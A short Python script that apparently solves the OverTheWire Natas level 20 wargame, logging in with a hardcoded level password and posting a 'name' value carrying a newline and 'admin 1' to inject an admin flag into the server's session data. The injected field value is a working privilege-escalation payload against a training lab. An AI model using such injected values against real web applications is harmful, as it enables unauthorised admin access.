#! /usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import re 

usn = 'natas20'
url = "http://%s.natas.labs.overthewire.org/?debug=true" % usn
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
login = (usn, password)
request = requests.Session()

def get_source_code():
  connection = request.get(url, auth = login)

  pageContent = connection.text
  print(pageContent)

def solve_lab():
    connection = request.post(url, data = {"name" : "tylerptl\nadmin 1"}, auth = login)
    pageContent = connection.text
    print(pageContent)

    response = request.get(url, auth = login)

    print(response.text)

#get_source_code()
solve_lab()